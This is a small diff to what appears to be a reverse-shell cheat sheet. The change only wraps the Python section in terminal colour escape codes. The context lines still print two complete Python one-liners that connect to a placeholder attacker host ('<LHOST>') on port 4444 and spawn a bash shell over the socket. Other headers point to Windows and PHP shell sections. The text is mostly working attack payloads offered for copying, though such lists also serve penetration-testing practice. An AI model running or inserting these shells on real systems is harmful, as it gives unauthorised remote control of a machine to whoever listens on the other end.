@@ -62,6 +62,7 @@ Note: All Linux and mac shells are the same
 ---
 Py
 ---
+\x1b[34m
 python Shells:
 
 [1: Linux] python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
@@ -69,6 +70,7 @@ python Shells:
 [2: Windows] Last listing in the windows shells, I didn't want to clutter up this section
 
 [3: Linux] python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+\x1b[0m
 ---
 PHP
 ---
